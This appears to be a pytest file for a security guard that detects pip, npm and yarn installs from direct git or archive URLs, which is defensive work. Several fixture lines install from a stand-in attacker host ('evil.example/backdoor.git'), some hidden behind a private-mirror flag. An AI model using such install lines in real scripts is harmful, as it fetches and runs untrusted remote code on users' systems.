"""Tests for the untrusted-package-install-source guard.

Covers:
  - untrusted-package-install-source/pip-url-source (HIGH)
  - untrusted-package-install-source/npm-url-source (HIGH)
"""
from __future__ import annotations

from agentsec.guards.untrusted_package_install_source import UntrustedPackageInstallSourceGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_pip_git_install(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "#!/bin/bash\n"
        "pip install git+https://github.com/some-org/some-pkg.git\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)
    assert all(f.severity == "high" for f in findings)


def test_fires_on_pip_archive_url_install(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "pip3 install https://example.com/downloads/mypkg-1.0.tar.gz\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_fires_on_npm_github_shorthand(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text("npm install github:some-user/some-repo\n", encoding="utf-8")
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/npm-url-source" for f in findings)


def test_fires_on_yarn_git_url(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text("yarn add git+https://github.com/some-org/some-pkg.git\n", encoding="utf-8")
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/npm-url-source" for f in findings)


def test_fires_on_dockerfile_run_line(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12\n"
        "RUN pip install git+https://github.com/some-org/some-pkg.git\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_passes_ordinary_pip_install(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text("pip install requests==2.31.0\n", encoding="utf-8")
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_ordinary_npm_install(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text("npm install express@4.18.2\n", encoding="utf-8")
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_private_index_url(tmp_path: Path) -> None:
    # --index-url to a private/internal PyPI mirror is a legitimate, common pattern
    # that also contains an https:// substring -- must not be mistaken for a direct
    # URL install.
    (tmp_path / "setup.sh").write_text(
        "pip install --index-url https://pypi.internal.example.com/simple/ mypkg==1.0.0\n", encoding="utf-8"
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_url_in_unrelated_chained_command(tmp_path: Path) -> None:
    # The URL belongs to a `wget` chained after the install, NOT to the install itself --
    # an extremely common Dockerfile RUN idiom. Segment scanning must not mistake it for a
    # URL install target.
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12\n"
        "RUN pip install requests && wget https://example.com/tool.tar.gz\n", encoding="utf-8"
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_npm_install_then_echo_of_url(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text("npm install && echo 'see github:some/repo'\n", encoding="utf-8")
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_url_in_trailing_comment(tmp_path: Path) -> None:
    # A URL mentioned in a trailing `#` comment is not an install target.
    (tmp_path / "setup.sh").write_text(
        "pip install requests  # release notes at https://x.example/foo.tar.gz\n", encoding="utf-8"
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_fires_on_git_install_chained_after_ordinary_command(tmp_path: Path) -> None:
    # The source-ref install IS present, just not first on the line -- must still fire.
    (tmp_path / "setup.sh").write_text(
        "apt-get update && pip install git+https://github.com/some-org/some-pkg.git\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_index_url_does_not_mask_source_ref(tmp_path: Path) -> None:
    # A private-mirror flag must not blind detection of an INDEPENDENT direct git-ref install
    # target on the same command -- `pip install --index-url URL git+https://...` is valid pip
    # syntax where the git ref resolves directly regardless of the mirror flag.
    (tmp_path / "setup.sh").write_text(
        "pip install --index-url https://pypi.internal.example.com/simple/ "
        "git+https://evil.example/backdoor.git\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_index_url_before_archive_url_still_fires(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "pip install --trusted-host pypi.internal --index-url https://pypi.internal/simple "
        "https://evil.example/pkg-1.0.tar.gz\n", encoding="utf-8"
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_index_url_equals_form_mirror_only_stays_silent(tmp_path: Path) -> None:
    # The `--index-url=URL` (equals) form of a plain private-mirror install with no source ref
    # must still stay silent (the flag's own value is not a direct install target).
    (tmp_path / "setup.sh").write_text(
        "pip install --index-url=https://pypi.internal.example.com/simple/ mypkg==1.0.0\n", encoding="utf-8"
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_short_alias_index_url_mirror_stays_silent(tmp_path: Path) -> None:
    # pip's `-i` short alias for --index-url: a private mirror whose URL happens to end in an
    # archive extension must not be mistaken for a direct install target.
    (tmp_path / "setup.sh").write_text(
        "pip install -i https://pypi.internal.example.com/packages/mirror-bundle.zip mypkg==1.0.0\n",
        encoding="utf-8",
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_short_alias_index_url_does_not_mask_source_ref(tmp_path: Path) -> None:
    # `-i` mirror flag must not blind a co-located direct git-ref install target.
    (tmp_path / "setup.sh").write_text(
        "pip install -i https://pypi.internal/simple git+https://evil.example/backdoor.git\n",
        encoding="utf-8",
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_ignore_installed_flag_does_not_swallow_source_ref(tmp_path: Path) -> None:
    # `-I` is --ignore-installed (a valueless flag), NOT the `-i` index alias. The mirror-strip
    # must be case-SENSITIVE so `-I` doesn't consume the following git-ref target (false negative).
    (tmp_path / "setup.sh").write_text(
        "pip install -I git+https://evil.example/backdoor.git\n",
        encoding="utf-8",
    )
    findings = UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "untrusted-package-install-source/pip-url-source" for f in findings)


def test_pragma_opt_out(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "pip install git+https://github.com/trusted-org/pkg.git  "
        "# security: allow-untrusted-package-install-source\n", encoding="utf-8"
    )
    assert UntrustedPackageInstallSourceGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []
